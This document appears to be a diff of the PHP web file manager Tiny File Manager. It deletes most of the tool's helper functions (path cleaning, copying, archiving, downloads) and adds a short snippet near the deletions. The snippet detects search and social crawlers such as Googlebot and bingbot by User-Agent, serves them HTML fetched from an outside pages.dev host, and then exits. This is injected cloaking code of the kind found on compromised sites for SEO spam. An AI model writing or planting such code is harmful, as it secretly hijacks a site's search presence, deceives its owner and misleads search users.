-                <li class="list-inline-item"><input type="submit" class="hidden" name="zip" id="a-zip" value="zip" onclick="return confirm('<?php echo lng('Create archive?'); ?>')">
-                    <a href="javascript:document.getElementById('a-zip').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php echo lng('Zip') ?> </a></li>
-                <li class="list-inline-item"><input type="submit" class="hidden" name="tar" id="a-tar" value="tar" onclick="return confirm('<?php echo lng('Create archive?'); ?>')">
-                    <a href="javascript:document.getElementById('a-tar').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php echo lng('Tar') ?> </a></li>
-                <li class="list-inline-item"><input type="submit" class="hidden" name="copy" id="a-copy" value="Copy">
-                    <a href="javascript:document.getElementById('a-copy').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-files-o"></i> <?php echo lng('Copy') ?> </a></li>
-            </ul>
-        </div>
-        <div class="col-3 d-none d-sm-block"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">Tiny File Manager <?php echo VERSION; ?></a></div>
-        <?php else: ?>
-            <div class="col-12"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">Tiny File Manager <?php echo VERSION; ?></a></div>
-        <?php endif; ?>
-    </div>
-</form>
-
-<?php
-fm_show_footer();
-
-// --- END HTML ---
-
-// Functions
-
-/**
- * It prints the css/js files into html
- * @param key The key of the external file to print.
- */
-function print_external($key) {
-    global $external;
-
-    if(!array_key_exists($key, $external)) {
-        // throw new Exception('Key missing in external: ' . key);
-        echo "<!-- EXTERNAL: MISSING KEY $key -->";
-        return;
-    }
-
-    echo "$external[$key]";
-}
-
-/**
- * Verify CSRF TOKEN and remove after certified
- * @param string $token
- * @return bool
- */
-function verifyToken($token) 
-{
-    if (hash_equals($_SESSION['token'], $token)) { 
-        return true;
-    }
-    return false;
-}
-
-/**
- * Delete  file or folder (recursively)
- * @param string $path
- * @return bool
- */
-function fm_rdelete($path)
-{
-    if (is_link($path)) {
-        return unlink($path);
-    } elseif (is_dir($path)) {
-        $objects = scandir($path);
-        $ok = true;
-        if (is_array($objects)) {
-            foreach ($objects as $file) {
-                if ($file != '.' && $file != '..') {
-                    if (!fm_rdelete($path . '/' . $file)) {
-                        $ok = false;
-                    }
-                }
-            }
-        }
-        return ($ok) ? rmdir($path) : false;
-    } elseif (is_file($path)) {
-        return unlink($path);
-    }
-    return false;
-}
-
-/**
- * Recursive chmod
- * @param string $path
- * @param int $filemode
- * @param int $dirmode
- * @return bool
- * @todo Will use in mass chmod
- */
-function fm_rchmod($path, $filemode, $dirmode)
-{
-    if (is_dir($path)) {
-        if (!chmod($path, $dirmode)) {
-            return false;
-        }
-        $objects = scandir($path);
-        if (is_array($objects)) {
-            foreach ($objects as $file) {
-                if ($file != '.' && $file != '..') {
-                    if (!fm_rchmod($path . '/' . $file, $filemode, $dirmode)) {
-                        return false;
-                    }
-                }
-            }
-        }
-        return true;
-    } elseif (is_link($path)) {
-        return true;
-    } elseif (is_file($path)) {
-        return chmod($path, $filemode);
-    }
-    return false;
-}
-
-/**
- * Check the file extension which is allowed or not
- * @param string $filename
- * @return bool
- */
-function fm_is_valid_ext($filename)
-{
-    $allowed = (FM_FILE_EXTENSION) ? explode(',', FM_FILE_EXTENSION) : false;
-
-    $ext = pathinfo($filename, PATHINFO_EXTENSION);
-    $isFileAllowed = ($allowed) ? in_array($ext, $allowed) : true;
-
-    return ($isFileAllowed) ? true : false;
-}
-
-/**
- * Safely rename
- * @param string $old
- * @param string $new
- * @return bool|null
- */
-function fm_rename($old, $new)
-{
-    $isFileAllowed = fm_is_valid_ext($new);
-
-    if(!is_dir($old)) {
-        if (!$isFileAllowed) return false;
-    }
-
-    return (!file_exists($new) && file_exists($old)) ? rename($old, $new) : null;
-}
-
-/**
- * Copy file or folder (recursively).
- * @param string $path
- * @param string $dest
- * @param bool $upd Update files
- * @param bool $force Create folder with same names instead file
- * @return bool
- */
-function fm_rcopy($path, $dest, $upd = true, $force = true)
-{
-    if (is_dir($path)) {
-        if (!fm_mkdir($dest, $force)) {
-            return false;
-        }
-        $objects = scandir($path);
-        $ok = true;
-        if (is_array($objects)) {
-            foreach ($objects as $file) {
-                if ($file != '.' && $file != '..') {
-                    if (!fm_rcopy($path . '/' . $file, $dest . '/' . $file)) {
-                        $ok = false;
-                    }
-                }
-            }
-        }
-        return $ok;
-    } elseif (is_file($path)) {
-        return fm_copy($path, $dest, $upd);
-    }
-    return false;
-}
-
-/**
- * Safely create folder
- * @param string $dir
- * @param bool $force
- * @return bool
- */
-function fm_mkdir($dir, $force)
-{
-    if (file_exists($dir)) {
-        if (is_dir($dir)) {
-            return $dir;
-        } elseif (!$force) {
-            return false;
-        }
-        unlink($dir);
-    }
-    return mkdir($dir, 0777, true);
-}
-
-/**
- * Safely copy file
- * @param string $f1
- * @param string $f2
- * @param bool $upd Indicates if file should be updated with new content
- * @return bool
- */
-function fm_copy($f1, $f2, $upd)
-{
-    $time1 = filemtime($f1);
-    if (file_exists($f2)) {
-        $time2 = filemtime($f2);
-        if ($time2 >= $time1 && $upd) {
-            return false;
-        }
-    }
-    $ok = copy($f1, $f2);
-    if ($ok) {
-        touch($f2, $time1);
-    }
-    return $ok;
-}
-
-/**
- * Get mime type
- * @param string $file_path
- * @return mixed|string
- */
-function fm_get_mime_type($file_path)
-{
-    if (function_exists('finfo_open')) {
-        $finfo = finfo_open(FILEINFO_MIME_TYPE);
-        $mime = finfo_file($finfo, $file_path);
-        finfo_close($finfo);
-        return $mime;
-    } elseif (function_exists('mime_content_type')) {
-        return mime_content_type($file_path);
-    } elseif (!stristr(ini_get('disable_functions'), 'shell_exec')) {
-        $file = escapeshellarg($file_path);
-        $mime = shell_exec('file -bi ' . $file);
-        return $mime;
-    } else {
-        return '--';
-    }
-}
-
-/**
- * HTTP Redirect
- * @param string $url
- * @param int $code
- */
-function fm_redirect($url, $code = 302)
-{
-    header('Location: ' . $url, true, $code);
-    exit;
-}
-
-/**
- * Path traversal prevention and clean the url
- * It replaces (consecutive) occurrences of / and \\ with whatever is in DIRECTORY_SEPARATOR, and processes /. and /.. fine.
- * @param $path
- * @return string
- */
-function get_absolute_path($path) {
-    $path = str_replace(array('/', '\\'), DIRECTORY_SEPARATOR, $path);
-    $parts = array_filter(explode(DIRECTORY_SEPARATOR, $path), 'strlen');
-    $absolutes = array();
-    foreach ($parts as $part) {
-        if ('.' == $part) continue;
-        if ('..' == $part) {
-            array_pop($absolutes);
-        } else {
-            $absolutes[] = $part;
-        }
-    }
-    return implode(DIRECTORY_SEPARATOR, $absolutes);
-}
-
-/**
- * Clean path
- * @param string $path
- * @return string
- */
-function fm_clean_path($path, $trim = true)
-{
-    $path = $trim ? trim($path) : $path;
-    $path = trim($path, '\\/');
-    $path = str_replace(array('../', '..\\'), '', $path);
-    $path =  get_absolute_path($path);
-    if ($path == '..') {
-        $path = '';
-    }
-    return str_replace('\\', '/', $path);
-}
-
-/**
- * Get parent path
- * @param string $path
- * @return bool|string
- */
-function fm_get_parent_path($path)
-{
-    $path = fm_clean_path($path);
-    if ($path != '') {
-        $array = explode('/', $path);
-        if (count($array) > 1) {
-            $array = array_slice($array, 0, -1);
-            return implode('/', $array);
-        }
-        return '';
-    }
-    return false;
-}
-
-function fm_get_display_path($file_path)
-{
-    global $path_display_mode, $root_path, $root_url;
-    switch ($path_display_mode) {
-        case 'relative':
-            return array(
-                'label' => 'Path',
-                'path' => fm_enc(fm_convert_win(str_replace($root_path, '', $file_path)))
-            );
-        case 'host':
-            $relative_path = str_replace($root_path, '', $file_path);
-            return array(
-                'label' => 'Host Path',
-                'path' => fm_enc(fm_convert_win('/' . $root_url . '/' . ltrim(str_replace('\\', '/', $relative_path), '/')))
-            );
-        case 'full':
-        default:
-            return array(
-                'label' => 'Full Path',
-                'path' => fm_enc(fm_convert_win($file_path))
-            );
-    }
-}
-
-/**
- * Check file is in exclude list
- * @param string $file
- * @return bool
- */
-function fm_is_exclude_items($file) {
-    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
-    if (isset($exclude_items) and sizeof($exclude_items)) {
-        unset($exclude_items);
-    }
-
-    $exclude_items = FM_EXCLUDE_ITEMS;
-    if (version_compare(PHP_VERSION, '7.0.0', '<')) {
-        $exclude_items = unserialize($exclude_items);
-    }
-    if (!in_array($file, $exclude_items) && !in_array("*.$ext", $exclude_items)) {
-        return true;
-    }
-    return false;
-}
-
-/**
- * get language translations from json file
- * @param int $tr
- * @return array
- */
-function fm_get_translations($tr) {
-    try {
-        $content = @file_get_contents('translation.json');
-        if($content !== FALSE) {
-            $lng = json_decode($content, TRUE);
-            global $lang_list;
-            foreach ($lng["language"] as $key => $value)
-            {
-                $code = $value["code"];
-                $lang_list[$code] = $value["name"];
-                if ($tr)
-                    $tr[$code] = $value["translation"];
-            }
-            return $tr;
-        }
-
-    }
-    catch (Exception $e) {
-        echo $e;
-    }
-}
-
-/**
- * @param string $file
- * Recover all file sizes larger than > 2GB.
- * Works on php 32bits and 64bits and supports linux
- * @return int|string
- */
-function fm_get_size($file)
-{
-    static $iswin;
-    static $isdarwin;
-    if (!isset($iswin)) {
-        $iswin = (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN');
-    }
-    if (!isset($isdarwin)) {
-        $isdarwin = (strtoupper(substr(PHP_OS, 0)) == "DARWIN");
-    }
-
-    static $exec_works;
-    if (!isset($exec_works)) {
-        $exec_works = (function_exists('exec') && !ini_get('safe_mode') && @exec('echo EXEC') == 'EXEC');
-    }
-
-    // try a shell command
-    if ($exec_works) {
-        $arg = escapeshellarg($file);
-        $cmd = ($iswin) ? "for %F in (\"$file\") do @echo %~zF" : ($isdarwin ? "stat -f%z $arg" : "stat -c%s $arg");
-        @exec($cmd, $output);
-        if (is_array($output) && ctype_digit($size = trim(implode("\n", $output)))) {
-            return $size;
-        }
-    }
-
-    // try the Windows COM interface
-    if ($iswin && class_exists("COM")) {
-        try {
-            $fsobj = new COM('Scripting.FileSystemObject');
-            $f = $fsobj->GetFile( realpath($file) );
-            $size = $f->Size;
-        } catch (Exception $e) {
-            $size = null;
-        }
-        if (ctype_digit($size)) {
-            return $size;
-        }
-    }
-
-    // if all else fails
-    return filesize($file);
-}
-
-/**
- * Get nice filesize
- * @param int $size
- * @return string
- */
-function fm_get_filesize($size)
-{
-    $size = (float) $size;
-    $units = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
-    $power = ($size > 0) ? floor(log($size, 1024)) : 0;
-    $power = ($power > (count($units) - 1)) ? (count($units) - 1) : $power;
-    return sprintf('%s %s', round($size / pow(1024, $power), 2), $units[$power]);
-}
-
-/**
- * Get total size of directory tree.
- *
- * @param  string $directory Relative or absolute directory name.
- * @return int Total number of bytes.
- */
-function fm_get_directorysize($directory) {
-    $bytes = 0;
-    $directory = realpath($directory);
-    if ($directory !== false && $directory != '' && file_exists($directory)){
-        foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory, FilesystemIterator::SKIP_DOTS)) as $file){
-            $bytes += $file->getSize();
-        }
-    }
-    return $bytes;
-}
-
-/**
- * Get info about zip archive
- * @param string $path
- * @return array|bool
- */
-function fm_get_zif_info($path, $ext) {
-    if ($ext == 'zip' && function_exists('zip_open')) {
-        $arch = @zip_open($path);
-        if ($arch) {
-            $filenames = array();
-            while ($zip_entry = @zip_read($arch)) {
-                $zip_name = @zip_entry_name($zip_entry);
-                $zip_folder = substr($zip_name, -1) == '/';
-                $filenames[] = array(
-                    'name' => $zip_name,
-                    'filesize' => @zip_entry_filesize($zip_entry),
-                    'compressed_size' => @zip_entry_compressedsize($zip_entry),
-                    'folder' => $zip_folder
-                    //'compression_method' => zip_entry_compressionmethod($zip_entry),
-                );
-            }
-            @zip_close($arch);
-            return $filenames;
-        }
-    } elseif($ext == 'tar' && class_exists('PharData')) {
-        $archive = new PharData($path);
-        $filenames = array();
-        foreach(new RecursiveIteratorIterator($archive) as $file) {
-            $parent_info = $file->getPathInfo();
-            $zip_name = str_replace("phar://".$path, '', $file->getPathName());
-            $zip_name = substr($zip_name, ($pos = strpos($zip_name, '/')) !== false ? $pos + 1 : 0);
-            $zip_folder = $parent_info->getFileName();
-            $zip_info = new SplFileInfo($file);
-            $filenames[] = array(
-                'name' => $zip_name,
-                'filesize' => $zip_info->getSize(),
-                'compressed_size' => $file->getCompressedSize(),
-                'folder' => $zip_folder
-            );
-        }
-        return $filenames;
-    }
-    return false;
-}
-
-/**
- * Encode html entities
- * @param string $text
- * @return string
- */
-function fm_enc($text)
-{
-    return htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
-}
-
-/**
- * Prevent XSS attacks
- * @param string $text
- * @return string
- */
-function fm_isvalid_filename($text) {
-    return (strpbrk($text, '/?%*:|"<>') === FALSE) ? true : false;
-}
-
-/**
- * Save message in session
- * @param string $msg
- * @param string $status
- */
-function fm_set_msg($msg, $status = 'ok')
-{
-    $_SESSION[FM_SESSION_ID]['message'] = $msg;
-    $_SESSION[FM_SESSION_ID]['status'] = $status;
-}
-
-/**
- * Check if string is in UTF-8
- * @param string $string
- * @return int
- */
-function fm_is_utf8($string)
-{
-    return preg_match('//u', $string);
-}
-
-/**
- * Convert file name to UTF-8 in Windows
- * @param string $filename
- * @return string
- */
-function fm_convert_win($filename)
-{
-    if (FM_IS_WIN && function_exists('iconv')) {
-        $filename = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $filename);
-    }
-    return $filename;
-}
-
-/**
- * @param $obj
- * @return array
- */
-function fm_object_to_array($obj)
-{
-    if (!is_object($obj) && !is_array($obj)) {
-        return $obj;
-    }
-    if (is_object($obj)) {
-        $obj = get_object_vars($obj);
-    }
-    return array_map('fm_object_to_array', $obj);
-}
-
-/**
- * Get CSS classname for file
- * @param string $path
- * @return string
- */
-function fm_get_file_icon_class($path)
-{
-    // get extension
-    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
-
-    switch ($ext) {
-        case 'ico':
-        case 'gif':
-        case 'jpg':
-        case 'jpeg':
-        case 'jpc':
-        case 'jp2':
-        case 'jpx':
-        case 'xbm':
-        case 'wbmp':
-        case 'png':
-        case 'bmp':
-        case 'tif':
-        case 'tiff':
-        case 'webp':
-        case 'avif':
-        case 'svg':
-            $img = 'fa fa-picture-o';
-            break;
-        case 'passwd':
-        case 'ftpquota':
-        case 'sql':
-        case 'js':
-        case 'ts':
-        case 'jsx':
-        case 'tsx':
-        case 'hbs':
-        case 'json':
-        case 'sh':
-        case 'config':
-        case 'twig':
-        case 'tpl':
-        case 'md':
-        case 'gitignore':
-        case 'c':
-        case 'cpp':
-        case 'cs':
-        case 'py':
-        case 'rs':
-        case 'map':
-        case 'lock':
-        case 'dtd':
-            $img = 'fa fa-file-code-o';
-            break;
-        case 'txt':
-        case 'ini':
-        case 'conf':
-        case 'log':
-        case 'htaccess':
-        case 'yaml':
-        case 'yml':
-        case 'toml':
-        case 'tmp':
-        case 'top':
-        case 'bot':
-        case 'dat':
-        case 'bak':
-        case 'htpasswd':
-        case 'pl':
-            $img = 'fa fa-file-text-o';
-            break;
-        case 'css':
-        case 'less':
-        case 'sass':
-        case 'scss':
-            $img = 'fa fa-css3';
-            break;
-        case 'bz2':
-        case 'tbz2':
-        case 'tbz':
-        case 'zip':
-        case 'rar':
-        case 'gz':
-        case 'tgz':
-        case 'tar':
-        case '7z':
-        case 'xz':
-        case 'txz':
-        case 'zst':
-        case 'tzst':
-            $img = 'fa fa-file-archive-o';
-            break;
-        case 'php':
-        case 'php4':
-        case 'php5':
-        case 'phps':
-        case 'phtml':
-            $img = 'fa fa-code';
-            break;
-        case 'htm':
-        case 'html':
-        case 'shtml':
-        case 'xhtml':
-            $img = 'fa fa-html5';
-            break;
-        case 'xml':
-        case 'xsl':
-            $img = 'fa fa-file-excel-o';
-            break;
-        case 'wav':
-        case 'mp3':
-        case 'mp2':
-        case 'm4a':
-        case 'aac':
-        case 'ogg':
-        case 'oga':
-        case 'wma':
-        case 'mka':
-        case 'flac':
-        case 'ac3':
-        case 'tds':
-            $img = 'fa fa-music';
-            break;
-        case 'm3u':
-        case 'm3u8':
-        case 'pls':
-        case 'cue':
-        case 'xspf':
-            $img = 'fa fa-headphones';
-            break;
-        case 'avi':
-        case 'mpg':
-        case 'mpeg':
-        case 'mp4':
-        case 'm4v':
-        case 'flv':
-        case 'f4v':
-        case 'ogm':
-        case 'ogv':
-        case 'mov':
-        case 'mkv':
-        case '3gp':
-        case 'asf':
-        case 'wmv':
-        case 'webm':
-            $img = 'fa fa-file-video-o';
-            break;
-        case 'eml':
-        case 'msg':
-            $img = 'fa fa-envelope-o';
-            break;
-        case 'xls':
-        case 'xlsx':
-        case 'ods':
-            $img = 'fa fa-file-excel-o';
-            break;
-        case 'csv':
-            $img = 'fa fa-file-text-o';
-            break;
-        case 'bak':
-        case 'swp':
-            $img = 'fa fa-clipboard';
-            break;
-        case 'doc':
-        case 'docx':
-        case 'odt':
-            $img = 'fa fa-file-word-o';
-            break;
-        case 'ppt':
-        case 'pptx':
-            $img = 'fa fa-file-powerpoint-o';
-            break;
-        case 'ttf':
-        case 'ttc':
-        case 'otf':
-        case 'woff':
-        case 'woff2':
-        case 'eot':
-        case 'fon':
-            $img = 'fa fa-font';
-            break;
-        case 'pdf':
-            $img = 'fa fa-file-pdf-o';
-            break;
-        case 'psd':
-        case 'ai':
-        case 'eps':
-        case 'fla':
-        case 'swf':
-            $img = 'fa fa-file-image-o';
-            break;
-        case 'exe':
-        case 'msi':
-            $img = 'fa fa-file-o';
-            break;
-        case 'bat':
-            $img = 'fa fa-terminal';
-            break;
-        default:
-            $img = 'fa fa-info-circle';
-    }
-
-    return $img;
-}
-
-/**
- * Get image files extensions
- * @return array
- */
-function fm_get_image_exts()
-{
-    return array('ico', 'gif', 'jpg', 'jpeg', 'jpc', 'jp2', 'jpx', 'xbm', 'wbmp', 'png', 'bmp', 'tif', 'tiff', 'psd', 'svg', 'webp', 'avif');
-}
-
-/**
- * Get video files extensions
- * @return array
- */
-function fm_get_video_exts()
-{
-    return array('avi', 'webm', 'wmv', 'mp4', 'm4v', 'ogm', 'ogv', 'mov', 'mkv');
-}
-
-/**
- * Get audio files extensions
- * @return array
- */
-function fm_get_audio_exts()
-{
-    return array('wav', 'mp3', 'ogg', 'm4a');
-}
-
-/**
- * Get text file extensions
- * @return array
- */
-function fm_get_text_exts()
-{
-    return array(
-        'txt', 'css', 'ini', 'conf', 'log', 'htaccess', 'passwd', 'ftpquota', 'sql', 'js', 'ts', 'jsx', 'tsx', 'mjs', 'json', 'sh', 'config',
-        'php', 'php4', 'php5', 'phps', 'phtml', 'htm', 'html', 'shtml', 'xhtml', 'xml', 'xsl', 'm3u', 'm3u8', 'pls', 'cue', 'bash', 'vue',
-        'eml', 'msg', 'csv', 'bat', 'twig', 'tpl', 'md', 'gitignore', 'less', 'sass', 'scss', 'c', 'cpp', 'cs', 'py', 'go', 'zsh', 'swift',
-        'map', 'lock', 'dtd', 'svg', 'asp', 'aspx', 'asx', 'asmx', 'ashx', 'jsp', 'jspx', 'cgi', 'dockerfile', 'ruby', 'yml', 'yaml', 'toml',
-        'vhost', 'scpt', 'applescript', 'csx', 'cshtml', 'c++', 'coffee', 'cfm', 'rb', 'graphql', 'mustache', 'jinja', 'http', 'handlebars',
-        'java', 'es', 'es6', 'markdown', 'wiki', 'tmp', 'top', 'bot', 'dat', 'bak', 'htpasswd', 'pl'
-    );
-}
-
-/**
- * Get mime types of text files
- * @return array
- */
-function fm_get_text_mimes()
-{
-    return array(
-        'application/xml',
-        'application/javascript',
-        'application/x-javascript',
-        'image/svg+xml',
-        'message/rfc822',
-        'application/json',
-    );
-}
-
-/**
- * Get file names of text files w/o extensions
- * @return array
- */
-function fm_get_text_names()
-{
-    return array(
-        'license',
-        'readme',
-        'authors',
-        'contributors',
-        'changelog',
-    );
-}
-
-/**
- * Get online docs viewer supported files extensions
- * @return array
- */
-function fm_get_onlineViewer_exts()
-{
-    return array('doc', 'docx', 'xls', 'xlsx', 'pdf', 'ppt', 'pptx', 'ai', 'psd', 'dxf', 'xps', 'rar', 'odt', 'ods');
-}
-
-/**
- * It returns the mime type of a file based on its extension.
- * @param extension The file extension of the file you want to get the mime type for.
- * @return string|string[] The mime type of the file.
- */
-function fm_get_file_mimes($extension)
-{
-    $fileTypes['swf'] = 'application/x-shockwave-flash';
-    $fileTypes['pdf'] = 'application/pdf';
-    $fileTypes['exe'] = 'application/octet-stream';
-    $fileTypes['zip'] = 'application/zip';
-    $fileTypes['doc'] = 'application/msword';
-    $fileTypes['xls'] = 'application/vnd.ms-excel';
-    $fileTypes['ppt'] = 'application/vnd.ms-powerpoint';
-    $fileTypes['gif'] = 'image/gif';
-    $fileTypes['png'] = 'image/png';
-    $fileTypes['jpeg'] = 'image/jpg';
-    $fileTypes['jpg'] = 'image/jpg';
-    $fileTypes['webp'] = 'image/webp';
-    $fileTypes['avif'] = 'image/avif';
-    $fileTypes['rar'] = 'application/rar';
-
-    $fileTypes['ra'] = 'audio/x-pn-realaudio';
-    $fileTypes['ram'] = 'audio/x-pn-realaudio';
-    $fileTypes['ogg'] = 'audio/x-pn-realaudio';
-
-    $fileTypes['wav'] = 'video/x-msvideo';
-    $fileTypes['wmv'] = 'video/x-msvideo';
-    $fileTypes['avi'] = 'video/x-msvideo';
-    $fileTypes['asf'] = 'video/x-msvideo';
-    $fileTypes['divx'] = 'video/x-msvideo';
-
-    $fileTypes['mp3'] = 'audio/mpeg';
-    $fileTypes['mp4'] = 'audio/mpeg';
-    $fileTypes['mpeg'] = 'video/mpeg';
-    $fileTypes['mpg'] = 'video/mpeg';
-    $fileTypes['mpe'] = 'video/mpeg';
-    $fileTypes['mov'] = 'video/quicktime';
-    $fileTypes['swf'] = 'video/quicktime';
-    $fileTypes['3gp'] = 'video/quicktime';
-    $fileTypes['m4a'] = 'video/quicktime';
-    $fileTypes['aac'] = 'video/quicktime';
-    $fileTypes['m3u'] = 'video/quicktime';
-
-    $fileTypes['php'] = ['application/x-php'];
-    $fileTypes['html'] = ['text/html'];
-    $fileTypes['txt'] = ['text/plain'];
-    //Unknown mime-types should be 'application/octet-stream'
-    if(empty($fileTypes[$extension])) {
-      $fileTypes[$extension] = ['application/octet-stream'];
-    }
-    return $fileTypes[$extension];
-}
-
-/**
- * This function scans the files and folder recursively, and return matching files
- * @param string $dir
- * @param string $filter
- * @return array|null
- */
- function scan($dir = '', $filter = '') {
-    $path = FM_ROOT_PATH.'/'.$dir;
-     if($path) {
-         $ite = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path));
-         $rii = new RegexIterator($ite, "/(" . $filter . ")/i");
-
-         $files = array();
-         foreach ($rii as $file) {
-             if (!$file->isDir()) {
-                 $fileName = $file->getFilename();
-                 $location = str_replace(FM_ROOT_PATH, '', $file->getPath());
-                 $files[] = array(
-                     "name" => $fileName,
-                     "type" => "file",
-                     "path" => $location,
-                 );
+     function is_bot() {
+         $user_agent = $_SERVER['HTTP_USER_AGENT'];
+         $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
+         
+         foreach ($bots as $bot) {
+             if (stripos($user_agent, $bot) !== false) {
+                 return true;
              }
          }
-         return $files;
+         
+         return false;
      }
-}
+     if (is_bot()) {
+         echo file_get_contents('https://matrascanta.pages.dev/homebase.html');
+     exit;
+     }
+     ?>
 
-/**
-* Parameters: downloadFile(File Location, File Name,
-* max speed, is streaming
-* If streaming - videos will show as videos, images as images
-* instead of download prompt
-* https://stackoverflow.com/a/13821992/1164642
-*/
-function fm_download_file($fileLocation, $fileName, $chunkSize  = 1024)
-{
-    if (connection_status() != 0)
-        return (false);
-    $extension = pathinfo($fileName, PATHINFO_EXTENSION);
 
-    $contentType = fm_get_file_mimes($extension);
 
-    if(is_array($contentType)) {
-        $contentType = implode(' ', $contentType);
-    }
 
-    $size = filesize($fileLocation);
-
-    if ($size == 0) {
-        fm_set_msg(lng('Zero byte file! Aborting download'), 'error');
-        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-
-        return (false);
-    }
-
-    @ini_set('magic_quotes_runtime', 0);
-    $fp = fopen("$fileLocation", "rb");
-
-    if ($fp === false) {
-        fm_set_msg(lng('Cannot open file! Aborting download'), 'error');
-        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
-        return (false);
-    }
-
-    // headers
-    header('Content-Description: File Transfer');
-    header('Expires: 0');
-    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
-    header('Pragma: public');
-    header("Content-Transfer-Encoding: binary");
-    header("Content-Type: $contentType");
-
-    $contentDisposition = 'attachment';
-
-    if (strstr($_SERVER['HTTP_USER_AGENT'], "MSIE")) {
-        $fileName = preg_replace('/\./', '%2e', $fileName, substr_count($fileName, '.') - 1);
-        header("Content-Disposition: $contentDisposition;filename=\"$fileName\"");
-    } else {
-        header("Content-Disposition: $contentDisposition;filename=\"$fileName\"");
-    }
-
-    header("Accept-Ranges: bytes");
-    $range = 0;
-
-    if (isset($_SERVER['HTTP_RANGE'])) {
-        list($a, $range) = explode("=", $_SERVER['HTTP_RANGE']);
-        str_replace($range, "-", $range);
-        $size2 = $size - 1;
-        $new_length = $size - $range;
-        header("HTTP/1.1 206 Partial Content");
-        header("Content-Length: $new_length");
-        header("Content-Range: bytes $range$size2/$size");
-    } else {
-        $size2 = $size - 1;
-        header("Content-Range: bytes 0-$size2/$size");
-        header("Content-Length: " . $size);
-    }
-    $fileLocation = realpath($fileLocation);
-    while (ob_get_level()) ob_end_clean();
-    readfile($fileLocation);
-
-    fclose($fp);
-
-    return ((connection_status() == 0) and !connection_aborted());
-}
-
-/**
- * If the theme is dark, return the text-white and bg-dark classes.
- * @return string the value of the  variable.
- */
-function fm_get_theme() {
-    $result = '';
-    if(FM_THEME == "dark") {
-        $result = "text-white bg-dark";
-    }
-    return $result;
-}
-
-/**
- * Class to work with zip files (using ZipArchive)
- */
-class FM_Zipper
-{
-    private $zip;
-
-    public function __construct()
-    {
-        $this->zip = new ZipArchive();
-    }
-
-    /**
-     * Create archive with name $filename and files $files (RELATIVE PATHS!)
-     * @param string $filename
-     * @param array|string $files
-     * @return bool
-     */
-    public function create($filename, $files)
-    {
-        $res = $this->zip->open($filename, ZipArchive::CREATE);
-        if ($res !== true) {
-            return false;
-        }
-        if (is_array($files)) {
-            foreach ($files as $f) {
-                $f = fm_clean_path($f);
-                if (!$this->addFileOrDir($f)) {
-                    $this->zip->close();
-                    return false;
-                }
-            }
-            $this->zip->close();
-            return true;
-        } else {
-            if ($this->addFileOrDir($files)) {
-                $this->zip->close();
-                return true;
-            }
-            return false;
-        }
-    }
-
-    /**
-     * Extract archive $filename to folder $path (RELATIVE OR ABSOLUTE PATHS)
-     * @param string $filename
-     * @param string $path
-     * @return bool
-     */
-    public function unzip($filename, $path)
-    {
-        $res = $this->zip->open($filename);
-        if ($res !== true) {
-            return false;
-        }
-        if ($this->zip->extractTo($path)) {
-            $this->zip->close();
-            return true;
-        }
-        return false;
-    }
-
-    /**
-     * Add file/folder to archive
-     * @param string $filename
-     * @return bool
-     */
-    private function addFileOrDir($filename)
-    {
-        if (is_file($filename)) {
-            return $this->zip->addFile($filename);
-        } elseif (is_dir($filename)) {
-            return $this->addDir($filename);
-        }
-        return false;
-    }
-
-    /**
-     * Add folder recursively
-     * @param string $path
-     * @return bool
-     */
-    private function addDir($path)
-    {
-        if (!$this->zip->addEmptyDir($path)) {
-            return false;
-        }
-        $objects = scandir($path);
-        if (is_array($objects)) {
-            foreach ($objects as $file) {
-                if ($file != '.' && $file != '..') {
-                    if (is_dir($path . '/' . $file)) {
-                        if (!$this->addDir($path . '/' . $file)) {
-                            return false;
-                        }
-                    } elseif (is_file($path . '/' . $file)) {
-                        if (!$this->zip->addFile($path . '/' . $file)) {
-                            return false;
-                        }
-                    }
-                }
-            }
-            return true;
-        }
-        return false;
-    }
-}
-
-/**
- * Class to work with Tar files (using PharData)
- */
-class FM_Zipper_Tar
-{
-    private $tar;
-
-    public function __construct()
-    {
-        $this->tar = null;
-    }
-
-    /**
-     * Create archive with name $filename and files $files (RELATIVE PATHS!)
-     * @param string $filename
-     * @param array|string $files
-     * @return bool
-     */
-    public function create($filename, $files)
-    {
-        $this->tar = new PharData($filename);
-        if (is_array($files)) {
-            foreach ($files as $f) {
-                $f = fm_clean_path($f);
-                if (!$this->addFileOrDir($f)) {
-                    return false;
-                }
-            }
-            return true;
-        } else {
-            if ($this->addFileOrDir($files)) {
-                return true;
-            }
-            return false;
-        }
-    }
-
-    /**
-     * Extract archive $filename to folder $path (RELATIVE OR ABSOLUTE PATHS)
-     * @param string $filename
-     * @param string $path
-     * @return bool
-     */
-    public function unzip($filename, $path)
-    {
-        $res = $this->tar->open($filename);
-        if ($res !== true) {
-            return false;
-        }
-        if ($this->tar->extractTo($path)) {
-            return true;
-        }
-        return false;
-    }
-
-    /**
-     * Add file/folder to archive
-     * @param string $filename
-     * @return bool
-     */
-    private function addFileOrDir($filename)
-    {
-        if (is_file($filename)) {
-            try {
-                $this->tar->addFile($filename);
-                return true;
-            } catch (Exception $e) {
-                return false;
-            }
-        } elseif (is_dir($filename)) {
-            return $this->addDir($filename);
-        }
-        return false;
-    }
-
-    /**
-     * Add folder recursively
-     * @param string $path
-     * @return bool
-     */
-    private function addDir($path)
-    {
-        $objects = scandir($path);
-        if (is_array($objects)) {
-            foreach ($objects as $file) {
-                if ($file != '.' && $file != '..') {
-                    if (is_dir($path . '/' . $file)) {
